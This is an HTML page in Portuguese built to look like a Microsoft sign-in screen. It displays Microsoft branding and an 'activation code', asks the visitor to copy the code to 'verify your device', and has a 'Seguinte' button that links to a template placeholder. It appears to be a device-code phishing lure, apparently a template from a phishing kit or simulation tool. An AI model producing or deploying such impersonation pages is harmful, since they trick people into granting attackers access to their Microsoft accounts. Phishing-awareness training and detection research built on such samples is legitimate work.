<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sessão na sua conta</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Segoe UI', 'Segoe UI Web', Arial, sans-serif;
    background-color: #f3f2f1;
    color: #1b1a19;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    min-height: 100vh;
    padding: 48px 16px;
  }
  .card {
    background-color: #ffffff;
    width: 100%;
    max-width: 440px;
    padding: 44px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.12);
  }
  .brand { margin-bottom: 24px; display: flex; align-items: center; }
  .brand svg { height: 24px; width: auto; display: block; }
  h1 { font-size: 24px; font-weight: 600; margin: 0 0 12px 0; }
  p.instruction {
    font-size: 15px; line-height: 1.5; color: #323130; margin: 0 0 20px 0;
  }

  /* Caixa do código — clique seleciona tudo (só CSS, sem JavaScript) */
  .code-box {
    display: flex; align-items: center; justify-content: space-between;
    background-color: #f3f2f1; border: 1px solid #d2d0ce; border-radius: 4px;
    padding: 10px 14px; margin-bottom: 8px;
  }
  .code-display {
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 20px; font-weight: 700; letter-spacing: 3px; color: #201f1e;
    -webkit-user-select: all; -moz-user-select: all; -ms-user-select: all; user-select: all;
    cursor: pointer;
  }
  .code-hint { font-size: 12px; color: #605e5c; margin: 0 0 24px 0; }

  label {
    display: block; font-size: 13px; font-weight: 600;
    margin-bottom: 6px; color: #323130;
  }
  input.user-input {
    width: 100%; padding: 10px 12px; font-size: 16px; letter-spacing: 2px;
    border: none; border-bottom: 1px solid #605e5c; outline: none;
    font-family: 'Consolas', 'Courier New', monospace;
  }
  input.user-input:focus { border-bottom: 2px solid #0067b8; }

  .actions { margin-top: 32px; text-align: right; }

  .footer { margin-top: 56px; font-size: 12px; color: #605e5c; text-align: center; }
  .footer a { color: #605e5c; margin: 0 6px; text-decoration: none; }
</style>
</head>
<body>

<div class="card">

  <div class="brand">
    <svg viewBox="0 0 108 23" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
      <rect x="0" y="0" width="10.8" height="10.8" fill="#f25022"></rect>
      <rect x="12" y="0" width="10.8" height="10.8" fill="#7fba00"></rect>
      <rect x="0" y="12" width="10.8" height="10.8" fill="#00a4ef"></rect>
      <rect x="12" y="12" width="10.8" height="10.8" fill="#ffb900"></rect>
      <text x="28" y="17.5" font-family="'Segoe UI', Arial, sans-serif" font-size="18" font-weight="600" fill="#737373" letter-spacing="-0.3">Microsoft</text>
    </svg>
  </div>

  <h1>Introduza o código</h1>
  <p class="instruction">Copie o código de ativação abaixo e introduza-o para verificar o seu dispositivo.</p>

  <div class="code-box">
    <span class="code-display" id="codigo">CWDB-FHKT</span>
  </div>
  <p class="code-hint">Clique no código para o selecionar e copie com Ctrl+C.</p>

  <form method="post" rel="noopener" target="_self">
    <label for="code">Código de ativação</label>
    <input type="text" id="code" name="code" class="user-input" placeholder="CWDB-FHKT" autocomplete="off" spellcheck="false">
    <div class="actions">
      <a role="button" href="${submitLink}" rel="noopener"
         style="display:inline-block; color:#ffffff; background:#0078d4; border:5px solid #0078d4; border-radius:2px; padding:5px 20px; font-family:'Segoe UI', Arial, sans-serif; font-weight:600; font-size:14px; text-decoration:none;"
         target="_self">Seguinte</a>
    </div>
  </form>

  <div class="footer">
    <a href="#" rel="noopener" target="_self">Termos de utilização</a>
    <a href="#" rel="noopener" target="_self">Privacidade e cookies</a>
  </div>

</div>

</body>
</html>
